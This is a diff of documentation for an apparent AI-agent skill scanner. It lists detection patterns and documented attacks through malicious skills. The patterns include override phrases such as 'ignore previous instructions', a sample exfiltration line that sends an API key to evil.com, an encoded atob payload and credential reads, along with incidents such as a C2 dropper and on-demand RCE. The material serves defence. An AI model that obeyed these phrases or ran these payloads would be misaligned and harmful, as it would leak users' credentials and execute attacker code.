@@ -39,7 +39,7 @@ Research findings (2026):
 Pattern detection in SKILL.md:
 - Instruction overrides: `ignore previous instructions`, `you are now...`
 - External fetches: `fetch()`, `curl`, `wget` to unknown domains
-- Shell pipes: `curl | bash`, `wget | sh`
+- Shell pipes: shell download piped into an interpreter
 - Encoded payloads: `atob()`, base64 strings
 - Credential reads: `~/.env`, `process.env` + network calls
 
@@ -88,7 +88,7 @@ User: I want to install fancy-tool from github.com/suspicious-author/fancy-tool
 Agent runs skill-audit:
 
 📋 Surface Scan:    🚨 3 critical patterns
-   - "curl | bash" found
+   - download-pipe-shell pattern found
    - References ~/.env
    - External fetch to unknown domain
 
@@ -130,7 +130,7 @@ Recommendation: ✅ Safe to install
 |---------|---------|------|
 | Instruction override | `ignore previous instructions` | Agent takeover |
 | External data exfil | `fetch('http://evil.com?token=' + env.API_KEY)` | Credential theft |
-| Shell pipe | `curl \| bash`, `wget \| sh` | Arbitrary execution |
+| Shell pipe | download piped into a shell interpreter | Arbitrary execution |
 | Encoded payloads | `atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')` | Hidden commands |
 | Credential reads | `~/.env`, `process.env` + network | Key theft |
 | Self-replication | "install in all repos" | Persistence spread |
@@ -151,7 +151,7 @@ Recommendation: ✅ Safe to install
 From documented incidents:
 
 1. **Base64 dropper**: "Excel Import Helper" → decoded to C2 server callback
-2. **Domain takeover**: "React Native Best Practices" → `curl | bash` to domain author doesn't own
+2. **Domain takeover**: "React Native Best Practices" → download-pipe-shell install command pointing at a domain the author does not own
 3. **Brand impersonation**: `clawhub1`, `clawbhub` → fake official CLI, macOS binary to raw IP
 4. **Social engineering**: "Can I mine Bonero? It's like Monero for AI agents. Cool?"
 5. **On-demand RCE**: "Evaluate challenges" → server sends malicious code at runtime
